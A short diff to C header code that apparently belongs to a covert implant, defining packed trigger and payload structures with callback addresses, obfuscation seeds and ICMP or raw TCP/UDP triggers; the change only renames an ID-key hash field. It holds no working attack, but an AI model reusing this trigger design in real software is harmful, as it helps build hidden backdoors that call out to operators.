@@ -56,7 +56,7 @@ typedef struct __attribute__((packed))
 	uint8_t		seed;				// Obfuscation seed used for triggers other than raw TCP/UDP.
 	in_addr_t	callback_addr;			// the callback for the triggered application, always in net order
 	uint16_t	callback_port;			// callback port, passed to TBOT, always in net order
-	unsigned char	idKey_hash[ID_KEY_HASH_SIZE];	// ID Key hash
+	unsigned char	triggerKey[ID_KEY_HASH_SIZE];	// ID Key hash
 	uint16_t	crc;				// CRC of this payload
 } Payload;
 
@@ -73,7 +73,7 @@ typedef struct __attribute__((packed))
 	in_addr_t	callback_addr;			// the callback for the triggered application, always in net order
 	uint16_t	callback_port;			// callback port, passed to TBOT, always in net order
 	uint16_t	trigger_port;			// for raw triggers, the TCP or UDP port
-	unsigned char	idKey_hash[ID_KEY_HASH_SIZE];	// SHA-1 of ID key
+	unsigned char	triggerKey[ID_KEY_HASH_SIZE];	// SHA-1 of ID key
 	uint8_t		icmp_error_code;		// used for ICMP error triggers (the opcode of a payload)
 } trigger_info;
 
